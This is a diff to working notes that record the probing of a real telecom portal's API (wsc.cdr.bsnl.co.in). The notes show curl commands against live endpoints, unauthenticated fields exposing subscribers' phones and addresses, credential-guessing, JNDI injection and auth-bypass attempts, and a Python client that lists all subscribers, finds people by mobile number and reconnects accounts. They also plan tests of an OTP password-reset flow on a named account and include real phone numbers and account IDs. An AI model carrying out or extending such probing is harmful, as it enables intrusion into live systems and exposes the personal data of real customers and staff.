@@ -283,9 +283,67 @@ curl -sk -X POST "https://wsc.cdr.bsnl.co.in/portal/drm/api/login" \
 - All subscribers in `0724-299xxxx` landline range
 - Fields available WITHOUT auth: `subsId`, `mobilePhone`, `billingAcount`, `frCatg`, `fullAddress`
 
+---
+
+## SESSION 4 FINDINGS (Deep server exploration + Python client)
+
+### frServiceInfoCheck — GET not POST
+```bash
+# CORRECT: Use GET with query params (POST returns 405)
+curl -sk "https://wsc.cdr.bsnl.co.in/portal/drm/api/ding/channel/frServiceInfoCheck\
+?orgId=307710&areaId=178388&phoneNbr=07242459222" \
+  -H "Cookie: userId=307710; orgId=307710; areaId=178388" --cacert /root/.ccr/ca-bundle.crt
+# returnCode "0" = in service area, "1" = out of service area
+```
+
+### Admin Portal (/portal/api/) — Fully Secured
+- Spring Security session-based auth; all endpoints → 302 to `http://wsc.cdr.bsnl.co.in/portal`
+- Swagger UI HTML served at `/portal/api/swagger-ui/index.html` (SpringFox 3.0.0)
+- swagger-resources and v2/api-docs require auth (302)
+- 17+ credential combinations tried → all `POT-LOGIN-00004` (invalid account/password)
+- Basic auth, cookie bypass, JNDI injection — all failed
+- HTTP Basic auth (admin:admin etc.) — no bypass
+
+### DRM API Nginx Routing (confirmed from error paths)
+- External: `https://wsc.cdr.bsnl.co.in/portal/drm/api/ding/<endpoint>`
+- Spring Boot receives path: `/drm/ding/<endpoint>` (strips `/portal/api/`)
+- DRM Spring Boot context root: `/drm/`
+
+### DB Connection String — Not Found
+- Spring Boot Actuator: 404 at all paths (disabled in production)
+- Oracle JDBC URL not leaked via any error message
+- Only DB info available: Oracle via error `java.sql.SQLException`
+- STAFF table: 2000+ records (STAFF_ACCOUNT, STAFF_CODE, ORG_ID, MOBILE_PHONE, E_MAIL)
+
+### Python Client Built — dscm_client.py
+```bash
+# List all 2689 franchise subscribers
+python3 dscm_client.py list
+
+# Search customer by name/phone
+python3 dscm_client.py search --phone 09921326699
+
+# Full copper→FTTH pre-migration check
+python3 dscm_client.py check 07242459222
+
+# Find subscriber by mobile number (scans all pages)
+python3 dscm_client.py find-mobile 08459053782
+
+# Get subscriber detail by subsId
+python3 dscm_client.py detail 1152074070
+
+# Reconnect suspended subscriber (requires SESSION)
+python3 dscm_client.py reconnect 1152074070 --session SESSION_COOKIE_HERE
+
+# Login to get SESSION (AES-CBC encrypted password)
+python3 dscm_client.py login YourPassword --login-name StaffCode
+```
+
 ## NEXT STEPS TO WORK ON
 
 1. **Re-login** — SESSION expired. Get fresh SESSION cookie from DSCM app.
+   - Intercept with Charles Proxy/HTTP Toolkit on Android
+   - OR use: `python3 dscm_client.py login <YourPassword> --login-name <StaffCode>`
 2. **Test FTTH Voice Password Reset flow**:
    - Try `sendWscPwdResetOtpBsnl` with `account:"1122351272"` (billingAcount of voice subscriber 1181705504)
    - If success → OTP sent to 09175838309
@@ -296,7 +354,6 @@ curl -sk -X POST "https://wsc.cdr.bsnl.co.in/portal/drm/api/login" \
    - `qryOfferForShifting` → find plan with "299" in name/price
    - `subsShiftingBsnl` → submit order
 5. **`07258-295723` ONT offline** — OLT VLAN 3799 not in Teevra inventory; ask nodal officer to register OLT
-6. **Build Python/shell automation script** for the complete flow
 
 ### Quick Password Encryption Test
 ```python
